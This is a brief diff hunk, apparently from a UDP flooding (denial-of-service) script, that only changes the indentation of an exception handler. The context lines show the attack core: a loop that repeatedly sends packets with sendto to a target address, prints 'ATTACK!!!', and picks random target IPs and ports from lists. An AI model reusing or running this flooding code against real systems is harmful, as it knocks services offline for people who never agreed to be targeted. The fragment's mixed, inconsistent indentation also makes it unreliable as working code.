@@ -51,7 +51,7 @@ def run():
 			for x in range(times):
 				s.sendto(data,addr)
 			print(i +" ATTACK!!!")
-           except:             
+        except:
                         print("[!] ATTACK!!!")
                     ip = choice(ips)
                     port = int(choice(ports))
